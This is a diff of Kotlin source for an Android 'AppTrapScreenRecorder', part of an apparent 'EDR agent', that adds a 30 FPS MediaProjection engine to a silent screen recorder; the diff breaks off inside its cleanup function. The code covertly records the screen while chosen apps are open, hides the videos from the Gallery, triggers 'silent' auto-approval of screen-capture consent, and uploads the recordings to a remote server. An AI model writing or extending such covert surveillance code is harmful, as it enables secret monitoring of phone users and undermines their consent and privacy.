@@ -2,16 +2,21 @@ package com.edr.agent.screen
 
 import android.content.Context
 import android.graphics.Bitmap
+import android.hardware.display.DisplayManager
+import android.hardware.display.VirtualDisplay
 import android.media.MediaCodec
 import android.media.MediaCodecInfo
 import android.media.MediaFormat
 import android.media.MediaMuxer
+import android.media.projection.MediaProjection
 import android.os.Handler
 import android.os.HandlerThread
 import android.os.PowerManager
 import android.util.Log
+import android.view.Surface
 import com.edr.agent.crypto.EdrFileLocker
 import com.edr.agent.network.EdrHttpClient
+import com.edr.agent.network.EdrNetworkManager
 import com.edr.agent.service.EdrAccessibilityService
 import com.edr.agent.storage.EdrLocalStorage
 import com.edr.agent.storage.SyncPreferences
@@ -26,9 +31,19 @@ import java.util.Locale
 import java.util.concurrent.atomic.AtomicBoolean
 
 /**
- * Autonomous App Trap Screen Recorder.
- * Records screen frames silently while a trapped target app is in foreground,
- * encodes into standard H.264 MP4 video, and uploads to the central EDR server when closed.
+ * Autonomous App Trap Screen Recorder — Ultra Smooth Dual-Engine (v3.8.0)
+ *
+ * Engine 1 (Primary - Hardware 30 FPS):
+ *  • MediaProjection → MediaCodec Surface Input → VirtualDisplay.
+ *  • Hardware-accelerated H.264 at full 30 FPS, 2 Mbps bitrate, 720x1280 resolution.
+ *  • Zero CPU copy, zero screenshot jitter, butter-smooth 1:1 screen motion.
+ *
+ * Engine 2 (Autonomous Fallback):
+ *  • CFR screenshot-based encoder if MediaProjection token is temporarily pending.
+ *  • Triggers silent MediaProjection acquisition so subsequent sessions run on Engine 1.
+ *
+ * Recording is never indexed by MediaScanner (.nomedia in place).
+ * On upload failure or 4G LTE, files are AES-256-CBC encrypted & locked in /EDR/ folder.
  */
 object AppTrapScreenRecorder {
     private const val TAG = "AppTrapRecorder"
@@ -38,28 +53,29 @@ object AppTrapScreenRecorder {
     private var currentAppLabel: String? = null
     private var recordingStartTime = 0L
 
-    private var recordThread: HandlerThread? = null
-    private var recordHandler: Handler? = null
-    private var captureThread: HandlerThread? = null
-    private var captureHandler: Handler? = null
-    private var frameTicker: Runnable? = null
-    private var screenshotTicker: Runnable? = null
+    // Active engine flag: true = Hardware Surface (30 FPS), false = Screenshot Fallback
+    private var isHardwareMode = false
 
     private var outputFile: File? = null
     private var mediaMuxer: MediaMuxer? = null
     private var mediaCodec: MediaCodec? = null
+    private var inputSurface: Surface? = null
+    private var virtualDisplay: VirtualDisplay? = null
+    private var projectionCallback: MediaProjection.Callback? = null
     private var videoTrackIndex = -1
     private var isMuxerStarted = false
     private var frameCount = 0L
 
-    // Smooth 16 FPS resolution: 368x800 aligned to 16-pixel macroblocks.
-    // Matches the OS silent capture throughput (~16 unique FPS) so every encoded frame is fresh with zero stutter.
-    private const val WIDTH = 368   // must be multiple of 16 (23 * 16)
-    private const val HEIGHT = 800  // must be multiple of 16 (50 * 16)
-    private const val BITRATE = 1_500_000 // 1.5 Mbps — crisp video
-    private const val FPS = 16 // 16 FPS (62.5ms/frame) — smooth 1:1 playback matching capture rate
+    // Dedicated drain thread for hardware encoder output
+    private var drainThread: HandlerThread? = null
+    private var drainHandler: Handler? = null
+    private var drainRunnable: Runnable? = null
 
-    // Decoupled CFR frame buffer: capture thread updates latestYuv; encoder thread emits at exact 12 FPS
+    // Fallback screenshot thread & variables
+    private var captureThread: HandlerThread? = null
+    private var captureHandler: Handler? = null
+    private var screenshotTicker: Runnable? = null
+    private var frameTicker: Runnable? = null
     private val isTakingScreenshot = AtomicBoolean(false)
     private var lastScreenshotAttemptTime = 0L
     private val latestYuvLock = Any()
@@ -67,8 +83,20 @@ object AppTrapScreenRecorder {
     private var tempYuv: ByteArray? = null
     private var reusableArgb: IntArray? = null
     private var reusableYuv: ByteArray? = null
-    private var reusableBufferInfo: MediaCodec.BufferInfo? = null
     private val encoderLock = Any()
+
+    // Video recording parameters (720x1280: 16-pixel aligned, universal hardware support)
+    private const val HW_WIDTH = 720       // 45 * 16
+    private const val HW_HEIGHT = 1280     // 80 * 16
+    private const val HW_DENSITY = 260
+    private const val HW_FPS = 30
+    private const val HW_BITRATE = 2_000_000 // 2 Mbps crisp high-definition video
+
+    // Fallback parameters (368x800 for lower memory footprint)
+    private const val FB_WIDTH = 368
+    private const val FB_HEIGHT = 800
+    private const val FB_FPS = 16
+    private const val FB_BITRATE = 1_200_000
 
     private val httpClient = EdrHttpClient.uploadClient
 
@@ -78,21 +106,25 @@ object AppTrapScreenRecorder {
 
     /**
      * Starts recording screen silently because a trapped application opened.
+     * Prefers Engine 1 (Hardware 30 FPS via MediaProjection).
+     * Falls back to Engine 2 (Accessibility Screenshots) if token is pending.
      */
     @Synchronized
     fun startRecording(context: Context, packageName: String, appLabel: String) {
         if (isRecording.get()) {
-            Log.w(TAG, "Recording already active for $currentPackageName")
+            Log.w(TAG, "Recording already active for $currentPackageName — ignoring new start for $packageName")
             return
         }
 
         try {
             val recDir = EdrLocalStorage.getTrapRecordingsDir(context)
-
             val now = Date()
             val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.US).format(now)
             val timeStr = SimpleDateFormat("HH-mm-ss", Locale.US).format(now)
-            val safeAppName = appLabel.replace(Regex("[^a-zA-Z0-9._-]"), "_").trim('_').ifEmpty { packageName }
+            val safeAppName = appLabel
+                .replace(Regex("[^a-zA-Z0-9._-]"), "_")
+                .trim('_')
+                .ifEmpty { packageName }
             val filename = "trap_${safeAppName}__${dateStr}__${timeStr}.mp4"
             outputFile = File(recDir, filename)
 
@@ -100,165 +132,257 @@ object AppTrapScreenRecorder {
             currentAppLabel = appLabel
             recordingStartTime = System.currentTimeMillis()
             frameCount = 0L
-            isMuxerStarted = false
             videoTrackIndex = -1
-            isTakingScreenshot.set(false)
+            isMuxerStarted = false
 
-            // Setup MediaCodec H.264 video encoder
-            val encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
-            val chosenColor = chooseColorFormat(encoder)
+            val projection = ScreenStreamManager.mediaProjection
 
-            val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, WIDTH, HEIGHT).apply {
-                setInteger(MediaFormat.KEY_COLOR_FORMAT, chosenColor)
-                setInteger(MediaFormat.KEY_BIT_RATE, BITRATE)
-                setInteger(MediaFormat.KEY_FRAME_RATE, FPS)
-                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1) // Keyframe every 1s
-            }
-
-            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
-            encoder.start()
-            mediaCodec = encoder
-
-            mediaMuxer = MediaMuxer(outputFile!!.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
-
-            recordThread = HandlerThread("EDR_TrapRecorderThread").apply { start() }
-            recordHandler = Handler(recordThread!!.looper)
-            captureThread = HandlerThread("EDR_TrapCaptureThread").apply { start() }
-            captureHandler = Handler(captureThread!!.looper)
-
-            val yuvSize = WIDTH * HEIGHT * 3 / 2
-            reusableArgb = IntArray(WIDTH * HEIGHT)
-            reusableYuv = ByteArray(yuvSize)
-            latestYuv = ByteArray(yuvSize)
-            tempYuv = ByteArray(yuvSize)
-            reusableBufferInfo = MediaCodec.BufferInfo()
-
-            isRecording.set(true)
-            Log.i(TAG, "Started App Trap screen recording for $appLabel ($packageName) -> ${outputFile!!.name}")
-            EdrLocalStorage.appendEdrLog(context, "TRAP_REC", "Started screen recording for $appLabel ($packageName)")
-
-            // Seed initial dark frame into latestYuv and encode frame #0 immediately
-            try {
-                val initialBitmap = Bitmap.createBitmap(WIDTH, HEIGHT, Bitmap.Config.ARGB_8888)
-                val canvas = android.graphics.Canvas(initialBitmap)
-                canvas.drawColor(android.graphics.Color.rgb(15, 23, 42))
-                val seedYuv = bitmapToNv12(initialBitmap, WIDTH, HEIGHT)
-                synchronized(latestYuvLock) {
-                    System.arraycopy(seedYuv, 0, latestYuv!!, 0, yuvSize)
+            if (projection != null) {
+                // ── ENGINE 1: HARDWARE 30 FPS SURFACE RECORDING ──
+                startHardwareRecording(context, projection, packageName, appLabel)
+            } else {
+                // ── ENGINE 2: ACCESSIBILITY SCREENSHOT FALLBACK ──
+                Log.w(TAG, "MediaProjection token not ready. Starting fallback screenshot recorder & requesting token...")
+                EdrLocalStorage.appendEdrLog(
+                    context, "TRAP_REC",
+                    "MediaProjection pending. Using fallback recorder for $appLabel & requesting token."
+                )
+                // Proactively trigger silent MediaProjection auto-approval for next time
+                try {
+                    MediaProjectionCaptureActivity.launch(context)
+                } catch (e: Exception) {
+                    Log.w(TAG, "Cannot launch MediaProjectionCaptureActivity: ${e.message}")
                 }
-                initialBitmap.recycle()
-                encodeYuvFrame(seedYuv)
-            } catch (e: Exception) {
-                Log.w(TAG, "Could not seed initial frame: ${e.message}")
+                startFallbackRecording(context, packageName, appLabel)
             }
-
-            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
-
-            // Loop A: Independent silent screenshot grabber on captureThread.
-            // Chains next capture 35ms after completion to maximize smoothness without overlapping.
-            screenshotTicker = object : Runnable {
-                override fun run() {
-                    if (!isRecording.get()) return
-                    if (powerManager?.isInteractive == false) {
-                        captureHandler?.postDelayed(this, 800L)
-                        return
-                    }
-
-                    val a11y = EdrAccessibilityService.instance
-                    val now = System.currentTimeMillis()
-                    // Watchdog: If previous screenshot attempt hung for > 1500ms without callback, unlock it
-                    if (isTakingScreenshot.get() && (now - lastScreenshotAttemptTime > 1500L)) {
-                        Log.w(TAG, "Screenshot capture watchdog timeout (>1.5s), resetting lock.")
-                        isTakingScreenshot.set(false)
-                    }
-
-                    if (a11y != null && isTakingScreenshot.compareAndSet(false, true)) {
-                        lastScreenshotAttemptTime = now
-                        a11y.takeSilentScreenshot(WIDTH, HEIGHT) { bitmap ->
-                            try {
-                                if (isRecording.get() && bitmap != null) {
-                                    val scaled = if (bitmap.width == WIDTH && bitmap.height == HEIGHT) {
-                                        bitmap
-                                    } else {
-                                        Bitmap.createScaledBitmap(bitmap, WIDTH, HEIGHT, false)
-                                    }
-                                    val converted = bitmapToNv12(scaled, WIDTH, HEIGHT)
-                                    if (scaled !== bitmap) scaled.recycle()
-                                    bitmap.recycle()
-                                    synchronized(latestYuvLock) {
-                                        latestYuv?.let { dest ->
-                                            System.arraycopy(converted, 0, dest, 0, dest.size)
-                                        }
-                                    }
-                                } else {
-                                    bitmap?.recycle()
-                                }
-                            } catch (e: Exception) {
-                                Log.w(TAG, "Screenshot conversion error: ${e.message}")
-                                try { bitmap?.recycle() } catch (_: Exception) {}
-                            } finally {
-                                isTakingScreenshot.set(false)
-                                if (isRecording.get()) {
-                                    captureHandler?.post(screenshotTicker!!)
-                                }
-                            }
-                        }
-                    } else if (isRecording.get()) {
-                        captureHandler?.postDelayed(this, 30L)
-                    }
-                }
-            }
-
-            // Loop B: Exact Constant Frame Rate (CFR = 12 FPS) encoder loop.
-            // Emits 1 frame every 83ms aligned to real wall-clock time so 10s real = 10.0s MP4!
-            frameTicker = object : Runnable {
-                override fun run() {
-                    if (!isRecording.get()) return
-
-                    synchronized(encoderLock) {
-                        if (!isRecording.get()) return@synchronized
-                        val bufToEncode = tempYuv
-                        val src = latestYuv
-                        if (bufToEncode != null && src != null) {
-                            synchronized(latestYuvLock) {
-                                System.arraycopy(src, 0, bufToEncode, 0, bufToEncode.size)
-                            }
-                            encodeYuvFrame(bufToEncode)
-                        }
-                    }
-
-                    if (isRecording.get()) {
-                        val nextTargetMs = recordingStartTime + (frameCount * 1000L / FPS)
-                        val delay = (nextTargetMs - System.currentTimeMillis()).coerceIn(1L, (1000L / FPS))
-                        recordHandler?.postDelayed(this, delay)
-                    }
-                }
-            }
-
-            captureHandler?.post(screenshotTicker!!)
-            recordHandler?.postDelayed(frameTicker!!, (1000L / FPS))
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start screen recorder: ${e.message}", e)
+            Log.e(TAG, "Failed to start trap screen recorder: ${e.message}", e)
             EdrLocalStorage.appendEdrLog(context, "TRAP_ERR", "Failed starting trap recorder: ${e.message}")
             cleanup()
         }
     }
 
-    /**
-     * Determines the optimal color format supported by the device's hardware H.264 encoder.
-     */
+    // ─────────────────────────────────────────────────────────────
+    // ENGINE 1: HARDWARE 30 FPS (Surface Input + VirtualDisplay)
+    // ─────────────────────────────────────────────────────────────
+
+    private fun startHardwareRecording(
+        context: Context,
+        projection: MediaProjection,
+        packageName: String,
+        appLabel: String
+    ) {
+        isHardwareMode = true
+
+        val format = MediaFormat.createVideoFormat(
+            MediaFormat.MIMETYPE_VIDEO_AVC,
+            HW_WIDTH,
+            HW_HEIGHT
+        ).apply {
+            setInteger(
+                MediaFormat.KEY_COLOR_FORMAT,
+                MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface
+            )
+            setInteger(MediaFormat.KEY_BIT_RATE, HW_BITRATE)
+            setInteger(MediaFormat.KEY_FRAME_RATE, HW_FPS)
+            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1) // 1s keyframe for fast seeking
+            setInteger(MediaFormat.KEY_PRIORITY, 0)         // Realtime priority
+        }
+
+        val encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
+        encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
+        inputSurface = encoder.createInputSurface()
+        encoder.start()
+        mediaCodec = encoder
+
+        mediaMuxer = MediaMuxer(
+            outputFile!!.absolutePath,
+            MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4
+        )
+
+        projectionCallback = object : MediaProjection.Callback() {
+            override fun onStop() {
+                Log.w(TAG, "MediaProjection stopped by system during trap recording.")
+                if (isRecording.get()) {
+                    stopRecording(context.applicationContext)
+                }
+            }
+        }
+        projection.registerCallback(projectionCallback!!, null)
+
+        virtualDisplay = projection.createVirtualDisplay(
+            "EDR_TrapRecorder",
+            HW_WIDTH,
+            HW_HEIGHT,
+            HW_DENSITY,
+            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+            inputSurface,
+            null,
+            null
+        )
+
+        drainThread = HandlerThread("EDR_TrapDrainThread").apply { start() }
+        drainHandler = Handler(drainThread!!.looper)
+
+        isRecording.set(true)
+        Log.i(TAG, "Engine 1 Active: 30 FPS Hardware Trap Recording for $appLabel ($packageName) -> ${outputFile!!.name}")
+        EdrLocalStorage.appendEdrLog(
+            context, "TRAP_REC",
+            "Started 30 FPS hardware recording for $appLabel ($packageName)"
+        )
+
+        scheduleHwDrainLoop()
+    }
+
+    private fun scheduleHwDrainLoop() {
+        drainRunnable = object : Runnable {
+            override fun run() {
+                if (!isRecording.get()) return
+                try {
+                    drainEncoder(false)
+                } catch (e: Exception) {
+                    Log.e(TAG, "HW drain loop error: ${e.message}")
+                }
+                if (isRecording.get()) {
+                    drainHandler?.postDelayed(this, 33L) // ~30 FPS cadence
+                }
+            }
+        }
+        drainHandler?.postDelayed(drainRunnable!!, 33L)
+    }
+
+    // ─────────────────────────────────────────────────────────────
+    // ENGINE 2: ACCESSIBILITY SCREENSHOT FALLBACK
+    // ─────────────────────────────────────────────────────────────
+
+    private fun startFallbackRecording(
+        context: Context,
+        packageName: String,
+        appLabel: String
+    ) {
+        isHardwareMode = false
+
+        val encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC)
+        val chosenColor = chooseColorFormat(encoder)
+
+        val format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, FB_WIDTH, FB_HEIGHT).apply {
+            setInteger(MediaFormat.KEY_COLOR_FORMAT, chosenColor)
+            setInteger(MediaFormat.KEY_BIT_RATE, FB_BITRATE)
+            setInteger(MediaFormat.KEY_FRAME_RATE, FB_FPS)
+            setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1)
+        }
+
+        encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
+        encoder.start()
+        mediaCodec = encoder
+
+        mediaMuxer = MediaMuxer(outputFile!!.absolutePath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
+
+        drainThread = HandlerThread("EDR_TrapRecorderThread").apply { start() }
+        drainHandler = Handler(drainThread!!.looper)
+        captureThread = HandlerThread("EDR_TrapCaptureThread").apply { start() }
+        captureHandler = Handler(captureThread!!.looper)
+
+        val yuvSize = FB_WIDTH * FB_HEIGHT * 3 / 2
+        reusableArgb = IntArray(FB_WIDTH * FB_HEIGHT)
+        reusableYuv = ByteArray(yuvSize)
+        latestYuv = ByteArray(yuvSize)
+        tempYuv = ByteArray(yuvSize)
+
+        isRecording.set(true)
+        Log.i(TAG, "Engine 2 Active: Fallback Screenshot Recording for $appLabel ($packageName)")
+
+        val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
+
+        // Screenshot grabber loop
+        screenshotTicker = object : Runnable {
+            override fun run() {
+                if (!isRecording.get()) return
+                if (powerManager?.isInteractive == false) {
+                    captureHandler?.postDelayed(this, 800L)
+                    return
+                }
+
+                val a11y = EdrAccessibilityService.instance
+                val now = System.currentTimeMillis()
+                if (isTakingScreenshot.get() && (now - lastScreenshotAttemptTime > 1500L)) {
+                    isTakingScreenshot.set(false)
+                }
+
+                if (a11y != null && isTakingScreenshot.compareAndSet(false, true)) {
+                    lastScreenshotAttemptTime = now
+                    a11y.takeSilentScreenshot(FB_WIDTH, FB_HEIGHT) { bitmap ->
+                        try {
+                            if (isRecording.get() && bitmap != null) {
+                                val scaled = if (bitmap.width == FB_WIDTH && bitmap.height == FB_HEIGHT) {
+                                    bitmap
+                                } else {
+                                    Bitmap.createScaledBitmap(bitmap, FB_WIDTH, FB_HEIGHT, false)
+                                }
+                                val converted = bitmapToNv12(scaled, FB_WIDTH, FB_HEIGHT)
+                                if (scaled !== bitmap) scaled.recycle()
+                                bitmap.recycle()
+                                synchronized(latestYuvLock) {
+                                    latestYuv?.let { dest ->
+                                        System.arraycopy(converted, 0, dest, 0, dest.size)
+                                    }
+                                }
+                            } else {
+                                bitmap?.recycle()
+                            }
+                        } catch (e: Exception) {
+                            Log.w(TAG, "Screenshot conversion error: ${e.message}")
+                            try { bitmap?.recycle() } catch (_: Exception) {}
+                        } finally {
+                            isTakingScreenshot.set(false)
+                            if (isRecording.get()) {
+                                captureHandler?.post(screenshotTicker!!)
+                            }
+                        }
+                    }
+                } else if (isRecording.get()) {
+                    captureHandler?.postDelayed(this, 30L)
+                }
+            }
+        }
+
+        // Encoder CFR feed loop
+        frameTicker = object : Runnable {
+            override fun run() {
+                if (!isRecording.get()) return
+
+                synchronized(encoderLock) {
+                    if (!isRecording.get()) return@synchronized
+                    val bufToEncode = tempYuv
+                    val src = latestYuv
+                    if (bufToEncode != null && src != null) {
+                        synchronized(latestYuvLock) {
+                            System.arraycopy(src, 0, bufToEncode, 0, bufToEncode.size)
+                        }
+                        encodeYuvFrame(bufToEncode)
+                    }
+                }
+
+                if (isRecording.get()) {
+                    val nextTargetMs = recordingStartTime + (frameCount * 1000L / FB_FPS)
+                    val delay = (nextTargetMs - System.currentTimeMillis()).coerceIn(1L, (1000L / FB_FPS))
+                    drainHandler?.postDelayed(this, delay)
+                }
+            }
+        }
+
+        captureHandler?.post(screenshotTicker!!)
+        drainHandler?.postDelayed(frameTicker!!, (1000L / FB_FPS))
+    }
+
     private fun chooseColorFormat(codec: MediaCodec): Int {
         try {
             val caps = codec.codecInfo.getCapabilitiesForType(MediaFormat.MIMETYPE_VIDEO_AVC)
             for (color in caps.colorFormats) {
-                if (color == MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar) {
-                    return color
-                }
+                if (color == MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar) return color
             }
             for (color in caps.colorFormats) {
-                if (color == MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible) {
-                    return color
-                }
+                if (color == MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible) return color
             }
             return caps.colorFormats.firstOrNull() ?: MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar
         } catch (e: Exception) {
@@ -266,14 +390,8 @@ object AppTrapScreenRecorder {
         }
     }
 
-    /**
-     * Encodes a single NV12/YUV420 frame into H.264 at a strict constant frame rate (CFR)
-     * and muxes it into MP4. Every frame is spaced by exact 1_000_000L / FPS microseconds
-     * so playback duration matches real-time 1:1.
-     */
     private fun encodeYuvFrame(yuv: ByteArray) {
         val codec = mediaCodec ?: return
-
         try {
             val inputIndex = codec.dequeueInputBuffer(10000L)
             if (inputIndex >= 0) {
@@ -281,57 +399,20 @@ object AppTrapScreenRecorder {
                 inputBuffer.clear()
                 inputBuffer.put(yuv)
 
-                val ptsUs = frameCount * 1_000_000L / FPS
+                val ptsUs = frameCount * 1_000_000L / FB_FPS
                 frameCount++
                 codec.queueInputBuffer(inputIndex, 0, yuv.size, ptsUs, 0)
             }
-
             drainEncoder(false)
         } catch (e: Exception) {
-            Log.e(TAG, "Error encoding frame #$frameCount: ${e.message}")
+            Log.e(TAG, "Error encoding fallback frame #$frameCount: ${e.message}")
         }
     }
 
-    private fun drainEncoder(endOfStream: Boolean) {
-        val codec = mediaCodec ?: return
-        val muxer = mediaMuxer ?: return
-        val bufferInfo = reusableBufferInfo ?: MediaCodec.BufferInfo().also { reusableBufferInfo = it }
+    // ─────────────────────────────────────────────────────────────
+    // STOP RECORDING
+    // ─────────────────────────────────────────────────────────────
 
-        var retryCount = 0
-        while (true) {
-            val outputIndex = codec.dequeueOutputBuffer(bufferInfo, 10000L)
-            if (outputIndex == MediaCodec.INFO_TRY_AGAIN_LATER) {
-                if (!endOfStream) break
-                retryCount++
-                if (retryCount > 10) break
-            } else if (outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) {
-                if (isMuxerStarted) {
-                    Log.w(TAG, "Format changed after muxer started")
-                    continue
-                }
-                val newFormat = codec.outputFormat
-                videoTrackIndex = muxer.addTrack(newFormat)
-                muxer.start()
-                isMuxerStarted = true
-                Log.i(TAG, "MediaMuxer started with track: $videoTrackIndex")
-            } else if (outputIndex >= 0) {
-                val outputBuffer = codec.getOutputBuffer(outputIndex)
-                if (outputBuffer != null && bufferInfo.size > 0 && isMuxerStarted) {
-                    outputBuffer.position(bufferInfo.offset)
-                    outputBuffer.limit(bufferInfo.offset + bufferInfo.size)
-                    muxer.writeSampleData(videoTrackIndex, outputBuffer, bufferInfo)
-                }
-                codec.releaseOutputBuffer(outputIndex, false)
-                if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) {
-                    break
-                }
-            }
-        }
-    }
-
-    /**
-     * Stops the active recording, finalizes the MP4 file, and asynchronously uploads it to EDR backend.
-     */
     @Synchronized
     fun stopRecording(context: Context) {
         if (!isRecording.getAndSet(false)) return
@@ -342,55 +423,62 @@ object AppTrapScreenRecorder {
         val durationSec = (durationMs / 1000).toInt()
         var durationFormatted = String.format("%02d:%02d", durationSec / 60, durationSec % 60)
 
-        Log.i(TAG, "Stopping screen recording for $label ($pkg). Elapsed timer duration: $durationFormatted")
+        Log.i(TAG, "Stopping trap recording for $label ($pkg). Mode=${if (isHardwareMode) "Hardware-30FPS" else "Fallback"}. Elapsed: $durationFormatted")
         EdrLocalStorage.appendEdrLog(context, "TRAP_REC", "App closed. Finalizing video for $label ($durationFormatted)")
 
-        synchronized(encoderLock) {
-            try {
-                // If muxer hasn't started yet because MediaCodec hasn't output the format change,
-                // push the seed frame to force the encoder to generate SPS/PPS keyframe
-                if (!isMuxerStarted && mediaCodec != null) {
-                    val seed = latestYuv
-                    if (seed != null) {
-                        encodeYuvFrame(seed)
-                    }
-                }
+        if (isHardwareMode) {
+            // Stop feeding frames from VirtualDisplay
+            try { virtualDisplay?.release() } catch (ignored: Exception) {}
+            virtualDisplay = null
 
-                // Signal End of Stream at exact CFR PTS
-                val inputIndex = mediaCodec?.dequeueInputBuffer(10000L) ?: -1
-                if (inputIndex >= 0) {
-                    val ptsUs = frameCount * 1_000_000L / FPS
-                    mediaCodec?.queueInputBuffer(inputIndex, 0, 0, ptsUs, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
-                }
+            try {
+                projectionCallback?.let { ScreenStreamManager.mediaProjection?.unregisterCallback(it) }
+            } catch (ignored: Exception) {}
+            projectionCallback = null
+
+            try {
+                mediaCodec?.signalEndOfInputStream()
                 drainEncoder(true)
             } catch (e: Exception) {
-                Log.e(TAG, "Error draining encoder on stop: ${e.message}")
+                Log.e(TAG, "Error signalling EOS: ${e.message}")
             }
-
-            cleanup()
+        } else {
+            synchronized(encoderLock) {
+                try {
+                    val inputIndex = mediaCodec?.dequeueInputBuffer(10000L) ?: -1
+                    if (inputIndex >= 0) {
+                        val ptsUs = frameCount * 1_000_000L / FB_FPS
+                        mediaCodec?.queueInputBuffer(inputIndex, 0, 0, ptsUs, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
+                    }
+                    drainEncoder(true)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error draining fallback encoder: ${e.message}")
+                }
+            }
         }
+
+        cleanup()
 
         val video = outputFile
         if (video != null && video.exists() && video.length() > 500) {
-            // Read exact duration directly from the finalized MP4 container
+            // Read exact duration directly from MP4 container header
             try {
                 val retriever = android.media.MediaMetadataRetriever()
                 retriever.setDataSource(video.absolutePath)
-                val durMs = retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION)?.toLongOrNull()
+                val durMs = retriever.extractMetadata(
+                    android.media.MediaMetadataRetriever.METADATA_KEY_DURATION
+                )?.toLongOrNull()
                 retriever.release()
                 if (durMs != null && durMs > 0) {
                     val sec = (durMs / 1000).toInt()
                     durationFormatted = String.format("%02d:%02d", sec / 60, sec % 60)
                 }
             } catch (e: Exception) {
-                Log.w(TAG, "MediaMetadataRetriever duration extraction warning: ${e.message}")
+                Log.w(TAG, "MediaMetadataRetriever warning: ${e.message}")
             }
 
-            Log.i(TAG, "Video finalized cleanly: ${video.name} (${video.length()} bytes, duration: $durationFormatted)")
-            // NOTE: MediaScannerConnection.scanFile is intentionally OMITTED so recordings
-            // never appear in the phone's public Gallery.
-
-            // Asynchronously upload video directly to EDR Admin Server
+            Log.i(TAG, "Video finalized: ${video.name} (${video.length()} bytes, duration: $durationFormatted)")
+            // NOTE: MediaScannerConnection is intentionally omitted to keep file hidden from Gallery.
             uploadTrapRecording(context, video, pkg, label, durationFormatted)
         } else {
             Log.w(TAG, "Video file too small or missing (${video?.length()} bytes). Discarding.")
@@ -398,52 +486,98 @@ object AppTrapScreenRecorder {
         }
     }
 
-    private fun cleanup() {
-        try {
-            mediaCodec?.stop()
-            mediaCodec?.release()
-        } catch (ignored: Exception) {}
-        mediaCodec = null
+    // ─────────────────────────────────────────────────────────────
+    // ENCODER DRAIN
+    // ─────────────────────────────────────────────────────────────
 
-        try {
-            if (isMuxerStarted) {
-                mediaMuxer?.stop()
+    private val bufferInfo = MediaCodec.BufferInfo()
+
+    private fun drainEncoder(endOfStream: Boolean) {
+        val codec = mediaCodec ?: return
+        val muxer = mediaMuxer ?: return
+
+        var retries = 0
+        while (true) {
+            val idx = codec.dequeueOutputBuffer(bufferInfo, if (endOfStream) 50_000L else 10_000L)
+            when {
+                idx == MediaCodec.INFO_TRY_AGAIN_LATER -> {
+                    if (!endOfStream) break
+                    if (++retries > 15) break
+                }
+                idx == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> {
+                    if (!isMuxerStarted) {
+                        videoTrackIndex = muxer.addTrack(codec.outputFormat)
+                        muxer.start()
+                        isMuxerStarted = true
+                        Log.i(TAG, "MediaMuxer started with track index: $videoTrackIndex")
+                    }
+                }
+                idx >= 0 -> {
+                    val buf = codec.getOutputBuffer(idx)
+                    if (buf != null && bufferInfo.size > 0 && isMuxerStarted) {
+                        if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG == 0) {
+                            buf.position(bufferInfo.offset)
+                            buf.limit(bufferInfo.offset + bufferInfo.size)
+                            muxer.writeSampleData(videoTrackIndex, buf, bufferInfo)
+                            frameCount++
+                        }
+                    }
+                    codec.releaseOutputBuffer(idx, false)
+                    if (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) {
+                        break
+                    }
+                }
             }
-        } catch (e: Exception) {
-            Log.w(TAG, "MediaMuxer stop warning: ${e.message}")
         }
-        try {
-            mediaMuxer?.release()
-        } catch (ignored: Exception) {}
-        mediaMuxer = null
+    }
 
-        synchronized(latestYuvLock) {
-            latestYuv = null
-        }
-        tempYuv = null
-        isTakingScreenshot.set(false)
-        reusableArgb = null
-        reusableYuv = null
-        reusableBufferInfo = null
+    // ─────────────────────────────────────────────────────────────
+    // CLEANUP
+    // ─────────────────────────────────────────────────────────────
 
-        recordThread?.quitSafely()
-        recordThread = null
-        recordHandler = null
+    private fun cleanup() {
+        drainRunnable = null
+        drainThread?.quitSafely()
+        drainThread = null
+        drainHandler = null
+
         captureThread?.quitSafely()
         captureThread = null
         captureHandler = null
         frameTicker = null
         screenshotTicker = null
+
+        try { mediaCodec?.stop() } catch (ignored: Exception) {}
+        try { mediaCodec?.release() } catch (ignored: Exception) {}
+        mediaCodec = null
+
+        try { inputSurface?.release() } catch (ignored: Exception) {}
+        inputSurface = null
+
+        if (isMuxerStarted) {
+            try { mediaMuxer?.stop() } catch (e: Exception) {
+                Log.w(TAG, "MediaMuxer stop warning: ${e.message}")
+            }
+        }
+        try { mediaMuxer?.release() } catch (ignored: Exception) {}
+        mediaMuxer = null
+        isMuxerStarted = false
+
+        synchronized(latestYuvLock) { latestYuv = null }
+        tempYuv = null
+        reusableArgb = null
+        reusableYuv = null
+        isTakingScreenshot.set(false)
+
         currentPackageName = null
         currentAppLabel = null
